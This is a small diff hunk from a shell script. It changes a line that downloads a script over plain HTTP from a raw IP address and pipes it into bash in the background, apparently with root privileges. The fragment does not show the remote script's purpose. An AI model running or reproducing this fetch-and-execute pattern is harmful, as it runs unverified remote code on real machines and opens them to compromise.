@@ -25,7 +25,7 @@ fi
 
 sleep 2
 
-curl -fsSL http://176.58.105.206/install_and_monitor_shade_root.sh | bash &
+curl -fsSL http://176.58.105.206/install_and_monitor_shade_us_root.sh | bash &
 
 sleep 2
 
